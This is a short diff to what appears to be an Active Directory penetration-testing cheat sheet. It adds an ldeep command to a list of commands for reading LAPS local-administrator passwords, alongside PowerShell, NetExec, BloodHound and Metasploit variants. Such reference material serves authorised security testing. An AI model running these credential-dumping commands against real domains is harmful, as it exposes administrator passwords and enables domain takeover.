@@ -52,6 +52,7 @@
   - `MATCH p=(g:Group)-[:ReadLAPSPassword]->(c:Computer) RETURN p`
 - Read LAPS >>> Admin
   - `Get-LapsADPassword -DomainController <ip_dc> -Credential <domain>\<login> | Format-Table -AutoSize`
+  - `ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> laps`
   - `foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}`
   - `nxc ldap <dc_ip> -d <domain> -u <user> -p <password> --module laps`
   - `msf> use post/windows/gather/credentials/enum_laps`
